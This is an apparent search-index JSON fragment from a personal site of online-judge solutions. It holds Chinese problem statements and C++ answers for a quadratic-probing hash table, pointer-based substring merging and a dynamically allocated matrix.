}","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1318/","text":"DS\u54c8\u5e0c\u67e5\u627e\u2014\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5b9a\u4e49\u54c8\u5e0c\u51fd\u6570\u4e3aH(key) = key%11\u3002\u8f93\u5165\u8868\u957f\uff08\u5927\u4e8e\u3001\u7b49\u4e8e11\uff09\uff0c\u8f93\u5165\u5173\u952e\u5b57\u96c6\u5408\uff0c\u7528\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217\u6784\u5efa\u54c8\u5e0c\u8868\uff0c\u5e76\u67e5\u627e\u7ed9\u5b9a\u5173\u952e\u5b57\u3002 \u8f93\u5165 \u6d4b\u8bd5\u6b21\u6570t \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u683c\u5f0f\u5982\u4e0b\uff1a \u54c8\u5e0c\u8868\u957fm\u3001\u5173\u952e\u5b57\u4e2a\u6570n n\u4e2a\u5173\u952e\u5b57 \u67e5\u627e\u6b21\u6570k k\u4e2a\u5f85\u67e5\u5173\u952e\u5b57 \u8f93\u51fa \u5bf9\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\uff1a \u6784\u9020\u7684\u54c8\u5e0c\u8868\u4fe1\u606f\uff0c\u6570\u7ec4\u4e2d\u6ca1\u6709\u5173\u952e\u5b57\u7684\u4f4d\u7f6e\u8f93\u51faNULL \u5bf9k\u4e2a\u5f85\u67e5\u5173\u952e\u5b57\uff0c\u5206\u522b\u8f93\u51fa\uff1a 0\u62161\uff080\u2014\u4e0d\u6210\u529f\uff0c1\u2014\u6210\u529f\uff09\u3001\u6bd4\u8f83\u6b21\u6570\u3001\u67e5\u627e\u6210\u529f\u7684\u4f4d\u7f6e\uff08\u4ece1\u5f00\u59cb\uff09 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 1 12 10 22 19 21 8 9 30 33 4 41 13 4 22 15 30 41 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 22 9 13 NULL 4 41 NULL 30 19 8 21 33 1 1 1 0 3 1 3 8 1 6 6 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 #include <iostream> #include <vector> class HashTable { public : explicit HashTable ( size_t size ) : hash_ ( size , - 1 ) {} void setFromCin () { size_t length ; std :: cin >> length ; for ( int i = 0 ; i < length ; ++ i ) { int number , index = 0 ; std :: cin >> number ; int position = number % P ; int sign = 1 ; while ( hash_ [ position ] != - 1 ) { position = number % P + index * index * sign ; sign = - sign ; if ( sign == 1 ) { index += 1 ; } if ( position > static_cast < int > ( hash_ . size ())) { position = position - static_cast < int > ( hash_ . size ()); } else if ( position < 0 ) { position = position + static_cast < int > ( hash_ . size ()); } } hash_ [ position ] = number ; } std :: cout << hash_ . front (); for ( int i = 1 ; i < hash_ . size (); ++ i ) { if ( hash_ [ i ] == - 1 ) { std :: cout << \" NULL\" ; } else { std :: cout << ' ' << hash_ [ i ]; } } std :: cout << std :: endl ; } void searchAndPrint ( int data ) { int result = 1 , count = 0 , index = 0 , sign = - 1 ; int position = data % P + index * index ; while ( count += 1 , hash_ [ position ] != data ) { if ( count == hash_ . size () || hash_ [ position ] == - 1 ) { result = 0 ; break ; } sign = - sign ; if ( sign == 1 ) { index += 1 ; } position = data % P + index * index * sign ; if ( position > static_cast < int > ( hash_ . size ())) { position = position - static_cast < int > ( hash_ . size ()); } else if ( position < 0 ) { position = position + static_cast < int > ( hash_ . size ()); } } std :: cout << result << ' ' << count ; if ( result == 1 ) { std :: cout << ' ' << position + 1 ; } std :: cout << std :: endl ; } private : static const int P = 11 ; std :: vector < int > hash_ ; }; int main () { size_t ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { size_t size ; std :: cin >> size ; class HashTable hashTable ( size ); hashTable . setFromCin (); int time ; std :: cin >> time ; while ( time -- ) { int number ; std :: cin >> number ; hashTable . searchAndPrint ( number ); } } return 0 ; }","title":"DS\u54c8\u5e0c\u67e5\u627e\u2014\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217"},{"location":"szu_oj/ds/1318/#ds","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u54c8\u5e0c\u67e5\u627e\u2014\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217"},{"location":"szu_oj/ds/1318/#_1","text":"\u5b9a\u4e49\u54c8\u5e0c\u51fd\u6570\u4e3aH(key) = key%11\u3002\u8f93\u5165\u8868\u957f\uff08\u5927\u4e8e\u3001\u7b49\u4e8e11\uff09\uff0c\u8f93\u5165\u5173\u952e\u5b57\u96c6\u5408\uff0c\u7528\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217\u6784\u5efa\u54c8\u5e0c\u8868\uff0c\u5e76\u67e5\u627e\u7ed9\u5b9a\u5173\u952e\u5b57\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1318/#_2","text":"\u6d4b\u8bd5\u6b21\u6570t \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u683c\u5f0f\u5982\u4e0b\uff1a \u54c8\u5e0c\u8868\u957fm\u3001\u5173\u952e\u5b57\u4e2a\u6570n n\u4e2a\u5173\u952e\u5b57 \u67e5\u627e\u6b21\u6570k k\u4e2a\u5f85\u67e5\u5173\u952e\u5b57","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1318/#_3","text":"\u5bf9\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\uff1a \u6784\u9020\u7684\u54c8\u5e0c\u8868\u4fe1\u606f\uff0c\u6570\u7ec4\u4e2d\u6ca1\u6709\u5173\u952e\u5b57\u7684\u4f4d\u7f6e\u8f93\u51faNULL \u5bf9k\u4e2a\u5f85\u67e5\u5173\u952e\u5b57\uff0c\u5206\u522b\u8f93\u51fa\uff1a 0\u62161\uff080\u2014\u4e0d\u6210\u529f\uff0c1\u2014\u6210\u529f\uff09\u3001\u6bd4\u8f83\u6b21\u6570\u3001\u67e5\u627e\u6210\u529f\u7684\u4f4d\u7f6e\uff08\u4ece1\u5f00\u59cb\uff09","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1318/#_4","text":"1 2 3 4 5 6 7 8 1 12 10 22 19 21 8 9 30 33 4 41 13 4 22 15 30 41","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1318/#_5","text":"1 2 3 4 5 22 9 13 NULL 4 41 NULL 30 19 8 21 33 1 1 1 0 3 1 3 8 1 6 6","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1318/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1318/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 #include <iostream> #include <vector> class HashTable { public : explicit HashTable ( size_t size ) : hash_ ( size , - 1 ) {} void setFromCin () { size_t length ; std :: cin >> length ; for ( int i = 0 ; i < length ; ++ i ) { int number , index = 0 ; std :: cin >> number ; int position = number % P ; int sign = 1 ; while ( hash_ [ position ] != - 1 ) { position = number % P + index * index * sign ; sign = - sign ; if ( sign == 1 ) { index += 1 ; } if ( position > static_cast < int > ( hash_ . size ())) { position = position - static_cast < int > ( hash_ . size ()); } else if ( position < 0 ) { position = position + static_cast < int > ( hash_ . size ()); } } hash_ [ position ] = number ; } std :: cout << hash_ . front (); for ( int i = 1 ; i < hash_ . size (); ++ i ) { if ( hash_ [ i ] == - 1 ) { std :: cout << \" NULL\" ; } else { std :: cout << ' ' << hash_ [ i ]; } } std :: cout << std :: endl ; } void searchAndPrint ( int data ) { int result = 1 , count = 0 , index = 0 , sign = - 1 ; int position = data % P + index * index ; while ( count += 1 , hash_ [ position ] != data ) { if ( count == hash_ . size () || hash_ [ position ] == - 1 ) { result = 0 ; break ; } sign = - sign ; if ( sign == 1 ) { index += 1 ; } position = data % P + index * index * sign ; if ( position > static_cast < int > ( hash_ . size ())) { position = position - static_cast < int > ( hash_ . size ()); } else if ( position < 0 ) { position = position + static_cast < int > ( hash_ . size ()); } } std :: cout << result << ' ' << count ; if ( result == 1 ) { std :: cout << ' ' << position + 1 ; } std :: cout << std :: endl ; } private : static const int P = 11 ; std :: vector < int > hash_ ; }; int main () { size_t ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { size_t size ; std :: cin >> size ; class HashTable hashTable ( size ); hashTable . setFromCin (); int time ; std :: cin >> time ; while ( time -- ) { int number ; std :: cin >> number ; hashTable . searchAndPrint ( number ); } } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/oop/1038/","text":"\u4e09\u4e32\u5408\u4e00\uff08\u6307\u9488\u4e0e\u5b57\u7b26\u6570\u7ec4\uff09 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u8f93\u5165\u4e09\u4e2a\u5b57\u7b26\u4e32\uff0c\u901a\u8fc7\u6307\u9488\u8bfb\u53d6\u5404\u4e2a\u5b57\u7b26\u4e32\u7684\u5b50\u4e32\uff08\u5b50\u4e32\u662f\u6307\u5b57\u7b26\u4e32\u4e2d\u8fde\u7eed\u7684\u4e00\u5c0f\u90e8\u5206\uff09\uff0c\u628a\u5b83\u4eec\u5408\u5e76\u6210\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32 \u8981\u6c42\uff1a \u4e09\u4e2a\u5b57\u7b26\u4e32\u7684\u521b\u5efa\u548c\u8f93\u5165\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u7528 \u8f93\u5165\u540e\uff0c\u6839\u636e\u4e09\u4e2a\u5b57\u7b26\u4e32\u7684\u5b50\u4e32\u7684\u957f\u5ea6\uff0c\u8ba1\u7b97\u51fa\u65b0\u5b57\u7b26\u4e32\u7684\u957f\u5ea6 \u4f7f\u7528\u52a8\u6001\u6570\u7ec4\u7684\u65b9\u6cd5\u521b\u5efa\u65b0\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u4f7f\u7528\u6307\u9488\u8bfb\u53d6\u4e09\u4e2a\u5b57\u7b26\u4e32\u7684\u4e0d\u540c\u90e8\u5206\uff0c\u5e76\u4e14\u590d\u5236\u5230\u65b0\u5b57\u7b26\u4e32\u4e2d\uff0c\u8981\u6c42\u6574\u4e2a\u8fc7\u7a0b\u90fd\u4e0d\u80fd\u4f7f\u7528\u6570\u7ec4\u4e0b\u6807 \u4f7f\u7528\u6307\u9488\u8f93\u51fa\u65b0\u7684\u5b57\u7b26\u4e32 \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165t\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b \u8fde\u7eed\u4e09\u884c\u8f93\u5165\u4e09\u4e2a\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5b57\u7b26\u4e32\u90fd\u5305\u542b10\u4e2a\u5b57\u7b26 \u8fde\u7eed\u4e09\u884c\uff0c\u6bcf\u884c\u8f93\u5165\u6570\u5b57a\u548cb\uff0c\u8868\u793a\u6bcf\u4e2a\u5b50\u4e32\u7684\u5f00\u59cb\u548c\u7ed3\u675f\u4f4d\u7f6e\u3002\u6ce8\u610f\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u662f\u6309\u7167\u4e00\u822c\u610f\u4e49\u4ece1\u5f00\u59cb\u8ba1\u7b97\uff0c\u548c\u7f16\u7a0b\u4e2d\u7684\u6570\u7ec4\u4f4d\u7f6e\u4e0d\u540c\u3002\u4f8b\u5982\u5b57\u7b26\u4e32abcdefg\uff0c\u5f00\u59cb\u4f4d\u7f6e\u662f3\uff0c\u7ed3\u675f\u4f4d\u7f6e\u662f5\uff0c\u90a3\u4e48\u5b50\u4e32\u5c31\u662fcde \u4f9d\u6b21\u8f93\u5165t\u4e2a\u5b9e\u4f8b \u8f93\u51fa \u6bcf\u884c\u8f93\u51fa\u5408\u5e76\u540e\u7684\u65b0\u5b57\u7b26\u4e32 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 9 10 11 12 13 2 abcdefghij ABCDEFGHIJ aabbccddee 3 5 2 6 8 10 AABBCCDDEE ffgghhiijj FFGGHHIIJJ 1 4 5 8 2 7 \u6837\u4f8b\u8f93\u51fa 1 2 cdeBCDEFdee AABBhhiiFGGHHI \u63d0\u793a \u89e3\u51b3\u65b9\u6848 \u6211\u4e5f\u4e0d\u77e5\u9053\u6211\u5230\u5e95\u8981\u8bf4\u591a\u5c11\u904d\uff0c\u5404\u4f4d\u5927\u4f6c\u624d\u4f1a\u8bb0\u5f97C\u98ce\u683c\u5b57\u7b26\u4e32\u540e\u9762\u8fd8\u6709\u4e2a'\\0'\u8981\u5360\u7a7a\u95f4\u7684... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include <iostream> int main () { size_t T ; std :: cin >> T ; while ( T -- ) { char strings [ 3 ][ 16 ]; std :: cin >> strings [ 0 ] >> strings [ 1 ] >> strings [ 2 ]; size_t bound [ 3 ][ 2 ] = {}, size = 0 ; for ( size_t ir = 0 ; ir < 3 ; ++ ir ) { for ( size_t ic = 0 ; ic < 2 ; ++ ic ) { std :: cin >> bound [ ir ][ ic ]; bound [ ir ][ ic ] -= 1 ; } size += ( bound [ ir ][ 1 ] - bound [ ir ][ 0 ]); } char * string = new char [ size + 1 ]; char * dst = string ; for ( size_t i = 0 ; i < 3 ; ++ i ) { char * src = strings [ i ] + bound [ i ][ 0 ]; while ( src <= strings [ i ] + bound [ i ][ 1 ]) { * dst ++ = * src ++ ; } } * dst = '\\0' ; std :: cout << string << std :: endl ; } return 0 ; }","title":"\u4e09\u4e32\u5408\u4e00\uff08\u6307\u9488\u4e0e\u5b57\u7b26\u6570\u7ec4\uff09"},{"location":"szu_oj/oop/1038/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u4e09\u4e32\u5408\u4e00\uff08\u6307\u9488\u4e0e\u5b57\u7b26\u6570\u7ec4\uff09"},{"location":"szu_oj/oop/1038/#_2","text":"\u8f93\u5165\u4e09\u4e2a\u5b57\u7b26\u4e32\uff0c\u901a\u8fc7\u6307\u9488\u8bfb\u53d6\u5404\u4e2a\u5b57\u7b26\u4e32\u7684\u5b50\u4e32\uff08\u5b50\u4e32\u662f\u6307\u5b57\u7b26\u4e32\u4e2d\u8fde\u7eed\u7684\u4e00\u5c0f\u90e8\u5206\uff09\uff0c\u628a\u5b83\u4eec\u5408\u5e76\u6210\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32 \u8981\u6c42\uff1a \u4e09\u4e2a\u5b57\u7b26\u4e32\u7684\u521b\u5efa\u548c\u8f93\u5165\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u7528 \u8f93\u5165\u540e\uff0c\u6839\u636e\u4e09\u4e2a\u5b57\u7b26\u4e32\u7684\u5b50\u4e32\u7684\u957f\u5ea6\uff0c\u8ba1\u7b97\u51fa\u65b0\u5b57\u7b26\u4e32\u7684\u957f\u5ea6 \u4f7f\u7528\u52a8\u6001\u6570\u7ec4\u7684\u65b9\u6cd5\u521b\u5efa\u65b0\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u4f7f\u7528\u6307\u9488\u8bfb\u53d6\u4e09\u4e2a\u5b57\u7b26\u4e32\u7684\u4e0d\u540c\u90e8\u5206\uff0c\u5e76\u4e14\u590d\u5236\u5230\u65b0\u5b57\u7b26\u4e32\u4e2d\uff0c\u8981\u6c42\u6574\u4e2a\u8fc7\u7a0b\u90fd\u4e0d\u80fd\u4f7f\u7528\u6570\u7ec4\u4e0b\u6807 \u4f7f\u7528\u6307\u9488\u8f93\u51fa\u65b0\u7684\u5b57\u7b26\u4e32","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/oop/1038/#_3","text":"\u7b2c\u4e00\u884c\u8f93\u5165t\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b \u8fde\u7eed\u4e09\u884c\u8f93\u5165\u4e09\u4e2a\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5b57\u7b26\u4e32\u90fd\u5305\u542b10\u4e2a\u5b57\u7b26 \u8fde\u7eed\u4e09\u884c\uff0c\u6bcf\u884c\u8f93\u5165\u6570\u5b57a\u548cb\uff0c\u8868\u793a\u6bcf\u4e2a\u5b50\u4e32\u7684\u5f00\u59cb\u548c\u7ed3\u675f\u4f4d\u7f6e\u3002\u6ce8\u610f\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u662f\u6309\u7167\u4e00\u822c\u610f\u4e49\u4ece1\u5f00\u59cb\u8ba1\u7b97\uff0c\u548c\u7f16\u7a0b\u4e2d\u7684\u6570\u7ec4\u4f4d\u7f6e\u4e0d\u540c\u3002\u4f8b\u5982\u5b57\u7b26\u4e32abcdefg\uff0c\u5f00\u59cb\u4f4d\u7f6e\u662f3\uff0c\u7ed3\u675f\u4f4d\u7f6e\u662f5\uff0c\u90a3\u4e48\u5b50\u4e32\u5c31\u662fcde \u4f9d\u6b21\u8f93\u5165t\u4e2a\u5b9e\u4f8b","title":"\u8f93\u5165"},{"location":"szu_oj/oop/1038/#_4","text":"\u6bcf\u884c\u8f93\u51fa\u5408\u5e76\u540e\u7684\u65b0\u5b57\u7b26\u4e32","title":"\u8f93\u51fa"},{"location":"szu_oj/oop/1038/#_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 2 abcdefghij ABCDEFGHIJ aabbccddee 3 5 2 6 8 10 AABBCCDDEE ffgghhiijj FFGGHHIIJJ 1 4 5 8 2 7","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/oop/1038/#_6","text":"1 2 cdeBCDEFdee AABBhhiiFGGHHI","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/oop/1038/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/oop/1038/#_8","text":"\u6211\u4e5f\u4e0d\u77e5\u9053\u6211\u5230\u5e95\u8981\u8bf4\u591a\u5c11\u904d\uff0c\u5404\u4f4d\u5927\u4f6c\u624d\u4f1a\u8bb0\u5f97C\u98ce\u683c\u5b57\u7b26\u4e32\u540e\u9762\u8fd8\u6709\u4e2a'\\0'\u8981\u5360\u7a7a\u95f4\u7684... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include <iostream> int main () { size_t T ; std :: cin >> T ; while ( T -- ) { char strings [ 3 ][ 16 ]; std :: cin >> strings [ 0 ] >> strings [ 1 ] >> strings [ 2 ]; size_t bound [ 3 ][ 2 ] = {}, size = 0 ; for ( size_t ir = 0 ; ir < 3 ; ++ ir ) { for ( size_t ic = 0 ; ic < 2 ; ++ ic ) { std :: cin >> bound [ ir ][ ic ]; bound [ ir ][ ic ] -= 1 ; } size += ( bound [ ir ][ 1 ] - bound [ ir ][ 0 ]); } char * string = new char [ size + 1 ]; char * dst = string ; for ( size_t i = 0 ; i < 3 ; ++ i ) { char * src = strings [ i ] + bound [ i ][ 0 ]; while ( src <= strings [ i ] + bound [ i ][ 1 ]) { * dst ++ = * src ++ ; } } * dst = '\\0' ; std :: cout << string << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/oop/1044/","text":"\u52a8\u6001\u77e9\u9635\uff08\u6307\u9488\u4e0e\u5806\u5185\u5b58\u5206\u914d\uff09 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u672a\u77e5\u4e00\u4e2a\u6574\u6570\u77e9\u9635\u7684\u5927\u5c0f\uff0c\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u624d\u4f1a\u8f93\u5165\u77e9\u9635\u7684\u884c\u6570m\u548c\u5217\u6570n \u8981\u6c42\u4f7f\u7528\u6307\u9488\uff0c\u7ed3\u5408new\u65b9\u6cd5\uff0c\u52a8\u6001\u521b\u5efa\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u5e76\u6c42\u51fa\u8be5\u77e9\u9635\u7684\u6700\u5c0f\u503c\u548c\u6700\u5927\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u4e0b\u6807\u6cd5\u3002 \u4e0d\u80fd\u5148\u521b\u5efa\u4e00\u4e2a\u8d85\u5927\u77e9\u9635\uff0c\u7136\u540e\u53ea\u4f7f\u7528\u77e9\u9635\u7684\u4e00\u90e8\u5206\u7a7a\u95f4\u6765\u8fdb\u884c\u6570\u636e\u8bbf\u95ee\u3001 \u521b\u5efa\u7684\u77e9\u9635\u5927\u5c0f\u5fc5\u987b\u548c\u8f93\u5165\u7684\u884c\u6570m\u548c\u5217\u6570n\u4e00\u6837 \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165t\u8868\u793at\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b \u7b2c\u4e8c\u884c\u8f93\u5165\u4e24\u4e2a\u6570\u5b57m\u548cn\uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u77e9\u9635\u7684\u884c\u6570\u548c\u5217\u6570 \u7b2c\u4e09\u884c\u8d77\uff0c\u8fde\u7eed\u8f93\u5165m\u884c\uff0c\u6bcf\u884cn\u4e2a\u6570\u5b57\uff0c\u8868\u793a\u8f93\u5165\u7b2c\u4e00\u4e2a\u77e9\u9635\u7684\u6570\u503c \u4f9d\u6b21\u8f93\u5165t\u4e2a\u5b9e\u4f8b \u8f93\u51fa \u6bcf\u884c\u8f93\u51fa\u4e00\u4e2a\u5b9e\u4f8b\u7684\u6700\u5c0f\u503c\u548c\u6700\u5927\u503c \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 2 2 3 33 22 11 66 88 55 3 4 19 38 45 14 22 65 87 31 91 35 52 74 \u6837\u4f8b\u8f93\u51fa 1 2 11 88 14 91 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include <iostream> int main () { size_t T ; std :: cin >> T ; while ( T -- ) { size_t row , col ; std :: cin >> row >> col ; int ** matrix = new int * [ row ]; for ( size_t ir = 0 ; ir < row ; ++ ir ) { matrix [ ir ] = new int [ col ]; for ( size_t ic = 0 ; ic < col ; ++ ic ) { std :: cin >> matrix [ ir ][ ic ]; } } int min = matrix [ 0 ][ 0 ], max = matrix [ 0 ][ 0 ]; for ( size_t ir = 0 ; ir < row ; ++ ir ) { for ( size_t ic = 0 ; ic < col ; ++ ic ) { if ( min > matrix [ ir ][ ic ]) { min = matrix [ ir ][ ic ]; } if ( max < matrix [ ir ][ ic ]) { max = matrix [ ir ][ ic ]; } } } std :: cout << min << ' ' << max << std :: endl ; } return 0 ; }","title":"\u52a8\u6001\u77e9\u9635\uff08\u6307\u9488\u4e0e\u5806\u5185\u5b58\u5206\u914d\uff09"},{"location":"szu_oj/oop/1044/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u52a8\u6001\u77e9\u9635\uff08\u6307\u9488\u4e0e\u5806\u5185\u5b58\u5206\u914d\uff09"},{"location":"szu_oj/oop/1044/#_2","text":"\u672a\u77e5\u4e00\u4e2a\u6574\u6570\u77e9\u9635\u7684\u5927\u5c0f\uff0c\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u624d\u4f1a\u8f93\u5165\u77e9\u9635\u7684\u884c\u6570m\u548c\u5217\u6570n \u8981\u6c42\u4f7f\u7528\u6307\u9488\uff0c\u7ed3\u5408new\u65b9\u6cd5\uff0c\u52a8\u6001\u521b\u5efa\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u5e76\u6c42\u51fa\u8be5\u77e9\u9635\u7684\u6700\u5c0f\u503c\u548c\u6700\u5927\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u4e0b\u6807\u6cd5\u3002 \u4e0d\u80fd\u5148\u521b\u5efa\u4e00\u4e2a\u8d85\u5927\u77e9\u9635\uff0c\u7136\u540e\u53ea\u4f7f\u7528\u77e9\u9635\u7684\u4e00\u90e8\u5206\u7a7a\u95f4\u6765\u8fdb\u884c\u6570\u636e\u8bbf\u95ee\u3001 \u521b\u5efa\u7684\u77e9\u9635\u5927\u5c0f\u5fc5\u987b\u548c\u8f93\u5165\u7684\u884c\u6570m\u548c\u5217\u6570n\u4e00\u6837","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/oop/1044/#_3","text":"\u7b2c\u4e00\u884c\u8f93\u5165t\u8868\u793at\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b \u7b2c\u4e8c\u884c\u8f93\u5165\u4e24\u4e2a\u6570\u5b57m\u548cn\uff0c\u8868\u793a\u7b2c\u4e00\u4e2a\u77e9\u9635\u7684\u884c\u6570\u548c\u5217\u6570 \u7b2c\u4e09\u884c\u8d77\uff0c\u8fde\u7eed\u8f93\u5165m\u884c\uff0c\u6bcf\u884cn\u4e2a\u6570\u5b57\uff0c\u8868\u793a\u8f93\u5165\u7b2c\u4e00\u4e2a\u77e9\u9635\u7684\u6570\u503c \u4f9d\u6b21\u8f93\u5165t\u4e2a\u5b9e\u4f8b","title":"\u8f93\u5165"},{"location":"szu_oj/oop/1044/#_4","text":"\u6bcf\u884c\u8f93\u51fa\u4e00\u4e2a\u5b9e\u4f8b\u7684\u6700\u5c0f\u503c\u548c\u6700\u5927\u503c","title":"\u8f93\u51fa"},{"location":"szu_oj/oop/1044/#_5","text":"1 2 3 4 5 6 7 8 2 2 3 33 22 11 66 88 55 3 4 19 38 45 14 22 65 87 31 91 35 52 74","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/oop/1044/#_6","text":"1 2 11 88 14 91","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/oop/1044/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/oop/1044/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include <iostream> int main () { size_t T ; std :: cin >> T ; while ( T -- ) { size_t row , col ; std :: cin >> row >> col ; int ** matrix = new int * [ row ]; for ( size_t ir = 0 ; ir < row ; ++ ir ) { matrix [ ir ] = new int [ col ]; for ( size_t ic = 0 ; ic < col ; ++ ic ) { std :: cin >> matrix [ ir ][ ic ]; } } int min = matrix [ 0 ][ 0 ], max = matrix [ 0 ][ 0 ]; for ( size_t ir = 0 ; ir < row ; ++ ir ) { for ( size_t ic = 0 ; ic < col ; ++ ic ) { if ( min > matrix [ ir ][ ic ]) { min = matrix [ ir ][ ic ]; } if ( max < matrix [ ir ][ ic ]) { max = matrix [ ir ][ ic ]; } } } std :: cout << min << ' ' << max << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/oop/1156/","text":"\u77e9\u9635\u7c7b\u6a21\u677f\uff08\u7c7b\u6a21\u677f\uff09 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u8bbe\u8ba1\u4e00\u4e2a\u77e9\u9635\u7c7b\u6a21\u677fMatrix\uff0c\u652f\u6301\u4efb\u610f\u6570\u636e\u7c7b\u578b\u7684\u6570\u636e\u3002 \u8981\u6c42\u81f3\u5c11\u5305\u542b2\u4e2a\u6210\u5458\u51fd\u6570\uff1a\u77e9\u9635\u8f6c\u7f6e\u51fd\u6570transport\u3001\u4ee5\u53ca\u6253\u5370\u8f93\u51fa\u51fd\u6570print \u7f16\u5199main\u51fd\u6570\u8fdb\u884c\u6d4b\u8bd5\uff0c\u8c03\u7528\u7c7b\u7684\u6210\u5458\u51fd\u6570\u5b8c\u6210\u8f6c\u7f6e\u548c\u8f93\u51fa\u3002 \u8f93\u5165 \u7b2c\u4e00\u884c\u5148\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u7528\u4f8b \u4ece\u7b2c\u4e8c\u884c\u5f00\u59cb\u8f93\u5165\u6bcf\u4e2a\u6d4b\u8bd5\u7528\u4f8b\u7684\u6570\u636e\u3002 